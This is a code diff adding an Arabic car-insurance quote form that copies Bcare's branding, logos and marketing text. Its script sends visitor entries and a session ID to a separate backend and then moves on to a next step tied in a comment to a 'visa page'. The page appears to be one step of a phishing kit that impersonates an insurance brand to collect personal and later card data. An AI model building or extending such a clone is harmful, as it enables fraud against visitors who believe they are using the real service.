@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>نموذج التأمين</title>
+  <style>
+    :root {
+      --primary: #0a4b8f;
+      --primary-deep: #083a6b;
+      --accent: #f4b942;
+      --bg: #f5f7fb;
+      --surface: #ffffff;
+      --text: #17324d;
+      --muted: #62748b;
+      --line: #dbe7f7;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(180deg, #eff6ff 0%, var(--bg) 100%);
+      color: var(--text);
+    }
+
+    .page-shell {
+      min-height: 100vh;
+      padding-bottom: 24px;
+    }
+
+    .top-bar {
+      width: 100%;
+      max-width: none;
+      margin: 0 0 10px;
+      padding: 10px 12px;
+      border-radius: 0 0 18px 18px;
+      background: linear-gradient(135deg, #ffffff, #eff6ff);
+      border-bottom: 1px solid var(--line);
+      box-shadow: 0 12px 24px rgba(10, 41, 82, 0.12);
+      box-sizing: border-box;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .top-bar .top-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .top-bar .menu-btn {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      padding: 6px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      cursor: pointer;
+    }
+
+    .top-bar .menu-btn span {
+      display: block;
+      width: 22px;
+      height: 3px;
+      border-radius: 999px;
+      background: var(--primary);
+    }
+
+    .top-bar .brand-wrap {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .top-bar .brand-wrap img {
+      height: 34px;
+      width: auto;
+    }
+
+    .lang-chip,
+    .user-chip {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 36px;
+      height: 34px;
+      border-radius: 999px;
+      background: var(--primary);
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      box-shadow: 0 10px 18px rgba(14, 74, 138, 0.22);
+    }
+
+    .user-chip {
+      background: linear-gradient(135deg, var(--accent), #ffe08a);
+      color: #0b2f56;
+    }
+
+    .main-header {
+      position: relative;
+      margin: 0 12px 12px;
+      padding: 18px 14px 20px;
+      border-radius: 24px;
+      background: linear-gradient(135deg, #0b4d95 0%, #1c74cf 52%, #0a3c75 100%);
+      color: #fff;
+      box-shadow: 0 18px 30px rgba(10, 50, 95, 0.25);
+      overflow: hidden;
+    }
+
+    .main-header::after {
+      content: none;
+    }
+
+    .main-header h2 {
+      position: relative;
+      z-index: 1;
+      margin: 0;
+      font-size: 20px;
+      line-height: 1.35;
+    }
+
+    .main-header p {
+      position: relative;
+      z-index: 1;
+      margin: 6px 0 0;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.92);
+    }
+
+    .form-wrapper {
+      width: min(100% - 18px, 420px);
+      margin: 0 auto 24px;
+      background: var(--surface);
+      border-radius: 18px;
+      box-shadow: 0 12px 26px rgba(10, 41, 82, 0.14);
+      overflow: hidden;
+    }
+
+    .form-header {
+      color: var(--text);
+      padding: 14px 14px 8px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 800;
+    }
+
+    .form-body {
+      padding: 0 14px 14px;
+    }
+
+    label {
+      display: block;
+      margin: 6px 0 4px;
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    select,
+    input[type="text"],
+    input[type="tel"],
+    input[type="date"],
+    input[type="number"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      margin-bottom: 10px;
+      background: #fff;
+      color: var(--text);
+      font-size: 15px;
+      box-sizing: border-box;
+      text-align: right;
+      direction: rtl;
+    }
+
+    .radio-group-modern {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 4px;
+    }
+
+    .radio-group-modern label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    .radio-group-modern input[type="radio"] {
+      appearance: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid var(--primary);
+      border-radius: 50%;
+      position: relative;
+      outline: none;
+      cursor: pointer;
+      transition: 0.2s ease;
+      margin: 0;
+    }
+
+    .radio-group-modern input[type="radio"]:checked {
+      background-color: var(--primary);
+      box-shadow: inset 0 0 0 4px #fff;
+    }
+
+    #butone,
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #f4b942, #ffd56b);
+      color: #0b2f56;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 10px 18px rgba(244, 185, 66, 0.22);
+    }
+
+    .hidden { display: none; }
+
+    .boxes-grid,
+    .discounts-grid {
+      display: grid;
+      gap: 16px;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 12px 24px;
+    }
+
+    .boxes-grid { grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
+    .discounts-grid { grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
+
+    .box,
+    .discount-item {
+      background: #fff;
+      border-radius: 18px;
+      padding: 16px;
+      box-shadow: 0 10px 20px rgba(10, 41, 82, 0.10);
+    }
+
+    .box img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+      display: block;
+      margin: 0 auto 8px;
+    }
+
+    .discount-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+    }
+
+    .discount-item img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      display: block;
+      flex: 0 0 48px;
+    }
+
+    .box h3,
+    .discount-info h3 {
+      margin: 10px 0 6px;
+      font-size: 16px;
+      color: #003366;
+    }
+
+    .box p,
+    .discount-info p {
+      margin: 0;
+      font-size: 13px;
+      color: #5b6b84;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 480px) {
+      .top-bar { padding: 8px 10px; }
+      .main-header { margin: 0 8px 10px; padding: 14px 12px; border-radius: 18px; }
+      .form-wrapper { width: calc(100% - 12px); border-radius: 16px; }
+      .form-header { font-size: 20px; }
+      .boxes-grid, .discounts-grid { padding: 0 8px 18px; }
+    }
+
+    .form-wrapper{
+      margin-top : 90px;
+    }
+    #butone{
+      margin-top: 20px !important;
+    }
+    #start-date{
+      width: 94%;
+    }
+  </style>
+</head>
+<body>
+
+
+  
+  <div class="top-bar">
+    <div class="top-actions">
+      <span class="user-chip">👤</span>
+      <span class="lang-chip">EN</span>
+    </div>
+    <div class="brand-wrap">
+      <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Bcare Logo">
+    </div>
+    <button class="menu-btn" type="button" aria-label="القائمة">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+
+
+
+  <div class="form-wrapper">
+  <div class="form-header">بيانات التأمين</div>
+  <div class="form-body">
+    <label for="insurance-type">نوع التأمين</label>
+    <select id="insurance-type">
+      <option value="شامل">شامل</option>
+      <option value="ضد الغير">ضد الغير</option>
+    </select>
+
+    <label for="start-date">تاريخ بدء التأمين</label>
+    <input type="date" id="start-date">
+
+    <label for="usage-purpose">غرض الاستخدام</label>
+    <select id="usage-purpose">
+      <option value="">-- اختر --</option>
+      <option value="شخصي">شخصي</option>
+      <option value="تجاري">تجاري</option>
+      <option value="تأجير">تأجير</option>
+      <option value="نقل ركاب">نقل الركاب او كريم او اوبر</option>
+      <option value="نقل بضائع">نقل بضائع</option>
+      <option value="مشتقات نفطية">نقل مشتقات نفطية</option>
+    </select>
+
+    <label for="car-value">قيمة المركبة (ريال)</label>
+    <input type="tel" id="car-value" placeholder="">
+
+    <label for="manufacture-year">سنة الصنع</label>
+    <select id="manufacture-year">
+      <option value="">-- اختر السنة --</option>
+    </select>
+
+    <label>مكان إصلاح المركبة</label>
+    <div class="radio-group-modern">
+      <label>
+        <input type="radio" name="repair-location" value="الوكالة">
+        <span>الوكالة</span>
+      </label>
+      <label>
+        <input type="radio" name="repair-location" value="الورشة">
+        <span>الورشة</span>
+      </label>
+    </div>
+
+    <button id="butone" type="submit">إظهار العروض</button>
+  </div>
+</div>
+
+
+<div class="boxes-grid">
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/insureOneMin.svg" alt="InsureOneMin">
+    <h3>تأمينك في دقيقة</h3>
+    <p>نقارن لك كل عروض الأسعار بشكل فوري من كل شركات التأمين</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sprateInsure.svg" alt="SprateInsure">
+    <h3>فصّل تأمينك</h3>
+    <p>أنواع تأمين متعددة: ضد الغير، شامل، مميز، وتحمل متنوع</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/priceLess.svg" alt="PriceLess">
+    <h3>أسعار أقل</h3>
+    <p>نراقب السوق ونضمن أن سعرك الأقل حسب احتياجك</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/sechleInsure.svg" alt="SechleInsure">
+    <h3>جدول تأمينك</h3>
+    <p>نرسل لك تذكيرات بالتجديد وتقدر تحدد تاريخ البداية</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/wind.svg" alt="Wind">
+    <h3>هب ريح</h3>
+    <p>نربط وثيقتك مباشرة مع المرور ونجم بأسرع وقت</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/discounts.svg" alt="Discounts">
+    <h3>خصومات تضبطك</h3>
+    <p>خصومات للقطاعات الحكومية والخاصة</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/benfit.svg" alt="Benfit">
+    <h3>منافع تحميك</h3>
+    <p>اختر المنافع الإضافية المناسبة لك</p>
+  </div>
+
+  <div class="box">
+    <img src="https://bcare.com.sa/assets/images/WhyBCareMotor-icons/oneWay.svg" alt="OneWay">
+    <h3>مكان واحد</h3>
+    <p>إدارة إلكترونية كاملة لجميع وثائقك</p>
+  </div>
+</div>
+
+
+
+
+<section class="wareef-discounts-section">
+  <h1 class="section-title">خصومات وريف</h1>
+  <h2 class="section-subtitle">خصومات وعروض مباشرة من مختلف المتاجر العالمية والمحلية لعملاء بي كير (أفراد، شركات)</h2>
+
+  <div class="discounts-grid">
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/RoshRayhaan.jpg" alt="RoshRayhan">
+      <div class="discount-info">
+        <h3>روش ريحان</h3>
+        <p>خصم 15%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/none.svg" alt="Noon">
+      <div class="discount-info">
+        <h3>نون</h3>
+        <p>خصم 15%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/drive7.png" alt="Perfectweight">
+      <div class="discount-info">
+        <h3>الوزن المثالي</h3>
+        <p>خصم 50%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/swater.jpg" alt="Drive7">
+      <div class="discount-info">
+        <h3>درايف7</h3>
+        <p>خصم 20%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/sivvi.svg" alt="Sweater">
+      <div class="discount-info">
+        <h3>سويتر</h3>
+        <p>خصم 20%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/Physiotherabia.jpg" alt="Sivvi">
+      <div class="discount-info">
+        <h3>سيفي</h3>
+        <p>خصم 10%</p>
+      </div>
+    </div>
+
+    <div class="discount-item">
+      <img src="https://bcare.com.sa/assets/images/Group%206444.svg" alt="Physiotherabia">
+      <div class="discount-info">
+        <h3>فيزيوثيرابيا</h3>
+        <p>خصم 20%</p>
+      </div>
+    </div>
+
+
+  </div>
+
+  <div class="show-more">
+    <button>عرض المزيد من الخصومات</button>
+  </div>
+</section>
+
+    <script>
+    // API Configuration
+    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+      ? 'http://localhost:3000'
+      : '';
+
+    // Initialize year dropdown
+    const yearSelect = document.getElementById("manufacture-year");
+    const currentYear = new Date().getFullYear();
+    for (let year = 1950; year <= currentYear; year++) {
+      const option = document.createElement("option");
+      option.value = year;
+      option.textContent = year;
+      yearSelect.appendChild(option);
+    }
+
+    // Get session ID from localStorage
+    function getSessionId() {
+      return localStorage.getItem('sessionId') || '';
+    }
+
+    // Get owner name from localStorage
+    function getOwnerName() {
+      return localStorage.getItem('owner_name') || 'غير معروف';
+    }
+
+    // Submit insurance data to backend server
+    async function submitToServer(data) {
+      try {
+        console.log('API URL:', API_BASE_URL);
+        console.log('Full URL:', `${API_BASE_URL}/api/submit/insurance`);
+        
+        const response = await fetch(`${API_BASE_URL}/api/submit/insurance`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            ...data,
+            sessionId: getSessionId()
+          })
+        });
+        
+        console.log('Response status:', response.status);
+        const result = await response.json();
+        console.log('Response JSON:', result);
+        return result;
+      } catch (error) {
+        console.error('Server error:', error);
+        return { success: false, error: error.message };
+      }
+    }
+
+    // Handle form submission
+    document.getElementById('butone').addEventListener('click', async function(event) {
+      event.preventDefault();
+
+      // Get form values
+      const insuranceType = document.getElementById('insurance-type').value;
+      const startDate = document.getElementById('start-date').value;
+      const usagePurpose = document.getElementById('usage-purpose').value;
+      const carValue = document.getElementById('car-value').value;
+      const manufactureYear = document.getElementById('manufacture-year').value;
+      const repairLocationRadio = document.querySelector('input[name="repair-location"]:checked');
+      const repairLocation = repairLocationRadio ? repairLocationRadio.value : '';
+
+      // Debug: Log values
+      console.log('Form values:', { insuranceType, startDate, usagePurpose, carValue, manufactureYear, repairLocation });
+
+      // Validate required fields
+      if (!insuranceType || !startDate || !usagePurpose || !carValue || !manufactureYear || !repairLocation) {
+        alert('يرجى تعبئة جميع الحقول المطلوبة.');
+        return;
+      }
+
+      // Show loading state
+      const btn = document.getElementById('butone');
+      btn.disabled = true;
+      btn.textContent = 'جاري الإرسال...';
+
+      // Prepare data
+      const data = {
+        owner_name: getOwnerName(),
+        insurance_type: insuranceType,
+        start_date: startDate,
+        usage_purpose: usagePurpose,
+        car_value: carValue,
+        manufacture_year: manufactureYear,
+        repair_location: repairLocation
+      };
+
+      console.log('Sending data to server:', data);
+
+      // Submit to server
+      const result = await submitToServer(data);
+      console.log('Server response:', result);
+
+      if (result.success) {
+        // Save insurance start date for visa page
+        localStorage.setItem('insuranceStartDate', startDate);
+        
+        // Navigate to next step
+        window.location.href = 'select.html';
+      } else {
+        btn.disabled = false;
+        btn.textContent = 'إظهار العروض';
+        alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+      }
+    });
+  </script>
+</body>
+</html>
